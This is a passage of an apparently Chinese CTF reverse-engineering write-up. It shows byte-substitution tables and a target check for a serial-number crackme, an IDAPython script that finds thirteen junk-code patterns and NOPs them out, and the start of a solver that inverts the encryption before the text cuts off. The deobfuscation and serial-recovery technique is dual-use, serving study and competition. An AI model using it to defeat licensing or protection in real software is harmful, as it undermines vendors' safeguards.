<span class="string">b&#x27;\x1d\xbcs,\xdb\x81\xe3\x04\x06U\x8dF\xfcQ\x83\x00G\x14v-C\xf8\xc6\x10l\x11\x1c\xc0\x96V\x99\xbd\xd7\xeb\xa8\t\xc4=\x0ci\xea\xfd.j\xbf\x947!\x0fo(\x1f\xa7\x1bg6\x13\xd9\xff\xe8d0?\xf4q+\x8c\\p\&#x27;m@2\xa0z#\xcct\x871\xc1DN\x80&amp;c\x07\x12W\x91&lt;`h|w\xb7\x84\xae\x9c\xc9\xc2\xd0\xc3\x97\xf1B%y$\xc8\x02\xca/\xe4\xf0Or\x92\x0b\xfb\xa3n\xe7\x1eT\xc7\xa4J\xe0\xd5\x86\xb1\xf7\x8bY\xd2\x89\xf5\x08E\n:\x93\xd4\xd6&#125;\xf9&#123;\x85\x9d\xfe\xd3&quot;L;~\xbe\xab\xb0\xb9\xa9\x88\xa6\xda\xbb\xf6\x1a\x05\xde\x18&gt;\x8e\xb4\xfa\xba\xb3\xb8\xb6k\x0eK5\xcb\xec\xdc\x17\x8f \xf2*eb\x82\xf3\xa2\xcf^\xb5\xe6\xce\x9ff\xe9PR\xef[\x9e\xdd\x8a\xe2Iau\xed8\xd8\xd1\xe1)\x15\x98ZS\x01\xa5M\xcd\xc5\x90]\r9\x7f4\xdf_\x16\x03\xee\xa1\xad\x9b\xaf\xb23X\xe5\x19HA\xaa\x95\xac\x9ax&#x27;</span></span><br><span class="line">    tbl6 = <span class="string">b&#x27;V\xd6x\xdc\x8fs\xcf\x8e\x0b\x14\xaa\xfa?=\xc0\xf1)\xde\x8b:t\xb1n\x8cH\xc5\xc4R\xdd.\xd76yD\x7f\xe1\xc1\x99\xd4\x9a\xd8h\xa52WC\x17\xa2\xdf\x87\x82\xf8\xe6\xe7\xb5\x004\xb2\xc9\rX\xaeK\xad\xc3\xc7\x88\x91\n\x051dz&gt;Mb\x06m\xa4\xc6\xe3Bji\xa3\xcc\xb0\x92a\xbf\x8a!Q\x07\xa7-&amp;A\x10\x08\x19\xe2\x1ckr\xca\xb4\x18\x94U\xdaJ\xf3Y^&quot;\x0cE\xbe\xfbG@&#125;\xd0]*\xf2\x0eO/\xcd\x90\x03\x97\xff&lt;\x968\x15\x80\xec\x0f\xc2\x1b\xb3\xeb\x9b~I\xaf&#123;g\x9d$\x86\tf\xf7\\;\xd3\xfd\x04o\x1f\xd9\xb8\xa8ev\x8d\x95\xbb\xb9l\xb7\xee\x01\xf4 `\x1au\xf65\x89%\xbd\x11\x83,\xbcF\xd5\xcb\xab(w\&#x27;\xd2\xc8\xe0\xb6N\xd1\x98\xe9\xcep\xe4P+\xe8\xa1#\xa6\xfe\xedS\x9c\xa9\x127Z[\x81\xbaLT\xf9\x9e\xdb3\xea\x939\x1d\x02qc\x16\x85\x1e\x9f|\xac\xf0\xf5\x84\xef\xa00\xe5\x13_\xfc&#x27;</span></span><br><span class="line">    tbl7 = <span class="string">b&#x27; ;\xec\xbe\xb6\x87\x85\x9fS\xefW\xe0\xc3\x01\xf8:\xe7AKr)\x0bl\x04y\xfc\x18\xb4g\xce\xf0\x0eZ4\x9e\xf6\x94\xacXo\xf3\xc42\x8aU\x9c\x07\xb0e\xe3\x9bRQ\xc7\xddc\xa9\x12\x0f\x95\x80Y\x1a\xcf&#123;0\xa8\xab1/a\x16\x1cMi&quot;p\xcbu&lt;\xd3t\x91\xf1O\xa5\xe2\xfd\xbd\x11m6+\xaa\xd5\x90\xe4\x8d\xda\xb8\xa2\xaf\x1d\x98\x1f\x88*I\x82x\x99\xebGf\xca?\xa6J&amp;\xdfD\x7f\x13\xa4\xb1\x02z\xc9\x9d\x00\xd6^\xbaC\xc2\x03\xff(5\xbcdq\xdc\xa3[\xd4\xee\x83\xf7F-k&#125;\xaeb\xd9\xa7,\xc8\r\xa1\x8ej\xe8`n\xb2@%h\xf4\xb7\xb3w\xc18\xc0\xd8\xd1\xfe\xb9\&#x27;\xbfE]=\x19\xf5\xcc9\xde\x81\x9a3\xc5s\x15\\P\x89N\xa0!$\xdb\xbbV\x17_\xad\xf2\x8c\x8f\x96\x97\xe5T\x86\t\x1bB\x10H\xb5\xf9~|\x05\xd7&gt;\x067\xe6\x93\xfa\xe9v\n\x1e\xed\x0c.\xcd\xfb\x08\xea\x84\x92\xd0\xc6L\xe1#\xd2\x14\x8b&#x27;</span></span><br><span class="line"></span><br><span class="line">    cipher = <span class="built_in">list</span>(plain)</span><br><span class="line">    tbls = [tbl1, tbl2, tbl3, tbl4, tbl5, tbl6, tbl7]</span><br><span class="line">    <span class="keyword">for</span> tbl <span class="keyword">in</span> tbls:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">            cipher[i] = tbl[cipher[i]]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(cipher)</span><br><span class="line"></span><br><span class="line">target = <span class="built_in">bytes</span>([<span class="number">121</span>, <span class="number">23</span>, <span class="number">66</span>, <span class="number">107</span>, <span class="number">59</span>, <span class="number">80</span>, <span class="number">122</span>, <span class="number">227</span>, <span class="number">70</span>, <span class="number">208</span>, <span class="number">222</span>, <span class="number">78</span>, <span class="number">36</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">106</span>, <span class="number">105</span>, <span class="number">208</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">240</span>, <span class="number">39</span>, <span class="number">36</span>, <span class="number">189</span>, <span class="number">192</span>, <span class="number">187</span>, <span class="number">227</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">163</span>, <span class="number">151</span>, <span class="number">48</span>, <span class="number">60</span>, <span class="number">182</span>, <span class="number">235</span>, <span class="number">104</span>, <span class="number">144</span>, <span class="number">9</span>, <span class="number">208</span>, <span class="number">234</span>, <span class="number">17</span>, <span class="number">242</span>, <span class="number">196</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">203</span>, <span class="number">195</span>, <span class="number">252</span>, <span class="number">69</span>, <span class="number">251</span>, <span class="number">92</span>, <span class="number">83</span>, <span class="number">192</span>, <span class="number">128</span>, <span class="number">58</span>, <span class="number">153</span>, <span class="number">89</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">74</span>, <span class="number">217</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">52</span>, <span class="number">222</span>, <span class="number">210</span>, <span class="number">236</span>, <span class="number">175</span>, <span class="number">74</span>, <span class="number">11</span>, <span class="number">164</span>, <span class="number">138</span>, <span class="number">182</span>, <span class="number">250</span>, <span class="number">147</span>, <span class="number">31</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">68</span>, <span class="number">238</span>, <span class="number">228</span>, <span class="number">214</span>, <span class="number">158</span>, <span class="number">244</span>, <span class="number">69</span>, <span class="number">18</span>, <span class="number">77</span>, <span class="number">55</span>, <span class="number">60</span>, <span class="number">240</span>, <span class="number">17</span>, <span class="number">248</span>, <span class="number">200</span>, <span class="number">68</span>, <span class="number">118</span>, <span class="number">99</span>, <span class="number">16</span>, <span class="number">115</span>, <span class="number">45</span>, <span class="number">104</span>, <span class="number">215</span>, <span class="number">157</span>, <span class="number">47</span>, <span class="number">195</span>, <span class="number">132</span>, <span class="number">42</span>, <span class="number">182</span>, <span class="number">204</span>, <span class="number">181</span>, <span class="number">55</span>, <span class="number">97</span>, <span class="number">79</span>, <span class="number">15</span>, <span class="number">22</span>, <span class="number">188</span>, <span class="number">187</span>, <span class="number">140</span>, <span class="number">83</span>, <span class="number">39</span>, <span class="number">238</span>, <span class="number">119</span>, <span class="number">170</span>, <span class="number">31</span>, <span class="number">156</span>, <span class="number">194</span>, <span class="number">24</span>, <span class="number">222</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> enc7(enc6(enc5(enc4(enc3(enc2(enc1(user_input))))))) == target</span><br></pre></td></tr></table></figure><h2 id="抛砖引玉"><a href="#抛砖引玉" class="headerlink" title="抛砖引玉"></a>抛砖引玉</h2><p>第七个函数比较小，当时一不小心反编译出来，就花了点时间写去混淆的 IDAPython 脚本。原理是基于模式匹配，识别出其中的 13 种无用代码的模式，再将它们 nop 掉。脚本在该函数上效果很好，运行后基本只剩下核心逻辑，代码如下（运行前要先创建加密函数，拿到函数的起始、结束地址）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop</span>(<span class="params">ea: <span class="built_in">int</span>, size: <span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        patch_byte(ea + i, <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printable</span>(<span class="params">hex_str: <span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">32</span> &lt;= <span class="built_in">int</span>(hex_str, <span class="number">16</span>) &lt; <span class="number">127</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deobfus</span>(<span class="params">start: <span class="built_in">int</span>, end: <span class="built_in">int</span></span>):</span></span><br><span class="line">    cur = start</span><br><span class="line">    <span class="keyword">while</span> cur &lt; end:</span><br><span class="line">        asm1 = generate_disasm_line(cur, <span class="number">0</span>)</span><br><span class="line">        asm2 = generate_disasm_line(cur+get_item_size(cur), <span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">        m1 = re.match(<span class="string">r&quot;mov +\[ebp\+var_(.+)\], *1000h&quot;</span>, asm1)</span><br><span class="line">        m2 = re.match(<span class="string">r&quot;lea +eax, *\[ebp\+var_(.+)\]&quot;</span>, asm2)</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> m2 <span class="keyword">and</span> m1.group(<span class="number">1</span>) == m2.group(<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;found pattern-1 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">            asm3 = generate_disasm_line(cur + <span class="number">0xd4</span> - <span class="number">6</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">r&quot;mov +\[ebp\+var_(.+)\], *eax&quot;</span>, asm3):</span><br><span class="line">                nop(cur, <span class="number">0xd4</span>)</span><br><span class="line">                cur += <span class="number">0xd4</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        m1 = re.match(<span class="string">r&quot;mov +\[ebp\+var_(.+)\], *(.&#123;2&#125;)h&quot;</span>, asm1)</span><br><span class="line">        m2 = re.match(<span class="string">r&quot;mov +\[ebp\+var_(.+)\], *(.&#123;2&#125;)h&quot;</span>, asm2)</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> m2 <span class="keyword">and</span> <span class="built_in">int</span>(m1.group(<span class="number">1</span>), <span class="number">16</span>) - <span class="built_in">int</span>(m2.group(<span class="number">1</span>), <span class="number">16</span>) == <span class="number">1</span> <span class="keyword">and</span> printable(m1.group(<span class="number">2</span>)) <span class="keyword">and</span> printable(m2.group(<span class="number">2</span>)):</span><br><span class="line">            <span class="keyword">if</span> get_bytes(cur + <span class="number">0x1d7</span> - <span class="number">2</span>, <span class="number">2</span>) == <span class="string">b&#x27;\xeb\xc7&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found pattern-2 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">                nop(cur, <span class="number">0x1d7</span>)</span><br><span class="line">                cur += <span class="number">0x1d7</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> get_bytes(cur + <span class="number">0x1bb</span> - <span class="number">2</span>, <span class="number">2</span>) == <span class="string">b&#x27;\xeb\xc7&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found pattern-2 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">                nop(cur, <span class="number">0x1bb</span>)</span><br><span class="line">                cur += <span class="number">0x1bb</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> get_bytes(cur + <span class="number">0x12d</span> - <span class="number">5</span>, <span class="number">5</span>) == <span class="string">b&#x27;\xE9\x5A\xFF\xFF\xFF&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found pattern-11 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">                nop(cur, <span class="number">0x12d</span>)</span><br><span class="line">                cur += <span class="number">0x12d</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        m1 = re.match(<span class="string">r&quot;and +\[ebp\+var_(.+)\], *0&quot;</span>, asm1)</span><br><span class="line">        m2 = re.match(<span class="string">r&quot;lea +eax, *\[ebp\+var_(.+)\]&quot;</span>, asm2)</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> m2 <span class="keyword">and</span> m1.group(<span class="number">1</span>) == m2.group(<span class="number">1</span>):</span><br><span class="line">            asm3 = generate_disasm_line(cur + <span class="number">0xb5</span> - <span class="number">7</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">r&quot;or +\[ebp\+var_(.+)\], *0FFFFFFFFh&quot;</span>, asm3):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found pattern-3 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">                nop(cur, <span class="number">0xb5</span>)</span><br><span class="line">                cur += <span class="number">0xb5</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        m1 = re.match(<span class="string">r&quot;and +\[ebp\+var_.+\], *0&quot;</span>, asm1)</span><br><span class="line">        m2 = re.match(<span class="string">r&quot;and +\[ebp\+var_.+\], *0&quot;</span>, asm2)</span><br><span class="line">        asm3 = generate_disasm_line(cur + <span class="number">0x73</span>, <span class="number">0</span>)</span><br><span class="line">        m3 = re.match(<span class="string">r&quot;cmp +\[ebp\+var_.+\], *0Ah&quot;</span>, asm3)</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> m2 <span class="keyword">and</span> m3:</span><br><span class="line">            <span class="keyword">if</span> get_bytes(cur + <span class="number">0x15c</span> - <span class="number">5</span>, <span class="number">5</span>) == <span class="string">b&quot;\xE9\x0A\xFF\xFF\xFF&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found pattern-4 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">                nop(cur, <span class="number">0x15c</span>)</span><br><span class="line">                cur += <span class="number">0x15c</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        m1 = re.match(<span class="string">r&quot;and +\[ebp\+var_.+\], *0&quot;</span>, asm1)</span><br><span class="line">        m2 = re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *1&quot;</span>, asm2)</span><br><span class="line">        asm3 = generate_disasm_line(cur + <span class="number">0x90</span>, <span class="number">0</span>)</span><br><span class="line">        m3 = re.match(<span class="string">r&quot;cmp +\[ebp\+var_.+\], *5&quot;</span>, asm3)</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> m2 <span class="keyword">and</span> m3:</span><br><span class="line">            <span class="keyword">if</span> get_bytes(cur + <span class="number">0x192</span> - <span class="number">5</span>, <span class="number">5</span>) == <span class="string">b&quot;\xE9\xF1\xFE\xFF\xFF&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found pattern-5 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">                nop(cur, <span class="number">0x192</span>)</span><br><span class="line">                cur += <span class="number">0x192</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> m2 <span class="keyword">and</span> get_bytes(cur + <span class="number">0x98</span>, <span class="number">2</span>) == <span class="string">b&quot;\x72\xC1&quot;</span>:</span><br><span class="line">            asm3 = generate_disasm_line(cur + <span class="number">0xb5</span> - <span class="number">0xa</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *1&quot;</span>, asm3):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found pattern-12 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">                nop(cur, <span class="number">0xb5</span>)</span><br><span class="line">                cur += <span class="number">0xb5</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        m1 = re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *0Ah&quot;</span>, asm1)</span><br><span class="line">        m2 = re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *2&quot;</span>, asm2)</span><br><span class="line">        asm3 = generate_disasm_line(cur + <span class="number">0x7a</span>, <span class="number">0</span>)</span><br><span class="line">        m3 = re.match(<span class="string">r&quot;cmp +\[ebp\+var_.+\], *9&quot;</span>, asm3)</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> m2 <span class="keyword">and</span> m3:</span><br><span class="line">            <span class="keyword">if</span> get_bytes(cur + <span class="number">0x109</span> - <span class="number">5</span>, <span class="number">5</span>) == <span class="string">b&quot;\xE9\x64\xFF\xFF\xFF&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found pattern-6 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">                nop(cur, <span class="number">0x109</span>)</span><br><span class="line">                cur += <span class="number">0x109</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        m1 = re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *1&quot;</span>, asm1)</span><br><span class="line">        m2 = re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *3&quot;</span>, asm2)</span><br><span class="line">        asm3 = generate_disasm_line(cur + <span class="number">0x92</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> m2 <span class="keyword">and</span> <span class="string">&quot;jg&quot;</span> <span class="keyword">in</span> asm3:</span><br><span class="line">            <span class="keyword">if</span> get_bytes(cur + <span class="number">0x14f</span> - <span class="number">5</span>, <span class="number">5</span>) == <span class="string">b&quot;\xE9\x37\xFF\xFF\xFF&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found pattern-7 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">                nop(cur, <span class="number">0x14f</span>)</span><br><span class="line">                cur += <span class="number">0x14f</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        m1 = re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *1&quot;</span>, asm1)</span><br><span class="line">        m2 = re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *5&quot;</span>, asm2)</span><br><span class="line">        asm3 = generate_disasm_line(cur + <span class="number">0xc8</span>, <span class="number">0</span>)</span><br><span class="line">        m3 = re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *2&quot;</span>, asm3)</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> m2 <span class="keyword">and</span> m3:</span><br><span class="line">            <span class="keyword">if</span> get_bytes(cur + <span class="number">0x198</span> - <span class="number">5</span>, <span class="number">5</span>) == <span class="string">b&quot;\xE9\xFE\xFE\xFF\xFF&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found pattern-8 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">                nop(cur, <span class="number">0x198</span>)</span><br><span class="line">                cur += <span class="number">0x198</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        m1 = re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *20h&quot;</span>, asm1)</span><br><span class="line">        m2 = re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *6Dh&quot;</span>, asm2)</span><br><span class="line">        asm3 = generate_disasm_line(cur + <span class="number">0x5c</span>, <span class="number">0</span>)</span><br><span class="line">        m3 = re.match(<span class="string">r&quot;cmp +\[ebp\+var_.+\], *3&quot;</span>, asm3)</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> m2 <span class="keyword">and</span> m3:</span><br><span class="line">            <span class="keyword">if</span> get_bytes(cur + <span class="number">0xf7</span> - <span class="number">5</span>, <span class="number">5</span>) == <span class="string">b&quot;\xE9\x58\xFF\xFF\xFF&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found pattern-9 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">                nop(cur, <span class="number">0xf7</span>)</span><br><span class="line">                cur += <span class="number">0xf7</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        m1 = re.match(<span class="string">r&quot;and +\[ebp\+var_.+\], *0&quot;</span>, asm1)</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> get_bytes(cur + <span class="number">0xe</span>, <span class="number">2</span>) == <span class="string">b&quot;\xEB\x0D&quot;</span> <span class="keyword">and</span> get_bytes(cur + <span class="number">0xc6</span>, <span class="number">5</span>) == <span class="string">b&quot;\xB9\x00\x04\x00\x00&quot;</span>:</span><br><span class="line">            asm3 = generate_disasm_line(cur + <span class="number">0x136</span> - <span class="number">6</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *eax&quot;</span>, asm3):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found pattern-10 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">                nop(cur, <span class="number">0x136</span>)</span><br><span class="line">                cur += <span class="number">0x136</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        m1 = re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *3&quot;</span>, asm1)</span><br><span class="line">        m2 = re.match(<span class="string">r&quot;mov +\[ebp\+var_.+\], *2&quot;</span>, asm2)</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">and</span> m2 <span class="keyword">and</span> get_bytes(cur + <span class="number">0x4c</span>, <span class="number">2</span>) == <span class="string">b&#x27;\x73\x34&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> get_bytes(cur + <span class="number">0x82</span> - <span class="number">2</span>, <span class="number">2</span>) == <span class="string">b&quot;\xEB\xBE&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found pattern-13 at: <span class="subst">&#123;<span class="built_in">hex</span>(cur)&#125;</span>&quot;</span>)</span><br><span class="line">                nop(cur, <span class="number">0x82</span>)</span><br><span class="line">                cur += <span class="number">0x82</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        cur += get_item_size(cur)</span><br><span class="line"></span><br><span class="line">start_ea = <span class="number">0x028ADA1C</span></span><br><span class="line">end_ea = <span class="number">0x028E5FC1</span></span><br><span class="line"></span><br><span class="line">deobfus(start_ea, end_ea)</span><br><span class="line">del_items(start_ea, <span class="number">0</span>, end_ea)</span><br><span class="line">create_insn(start_ea)</span><br><span class="line">add_func(start_ea)</span><br></pre></td></tr></table></figure><p>不过在其他 6 个函数上用的效果不是很好，因为其他函数中还有许多 call 无用 API 的模式没有考虑。它们肯定都可以通过模式识别进行定位并去除，考虑到未知的工作量，赛中就没有再写下去了。脚本放在这里，希望能起到抛砖引玉的作用。</p><h2 id="柳暗花明"><a href="#柳暗花明" class="headerlink" title="柳暗花明"></a>柳暗花明</h2><p>将每个加密函数的逆函数写出来再逐个调用就得到正确的序列号了，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 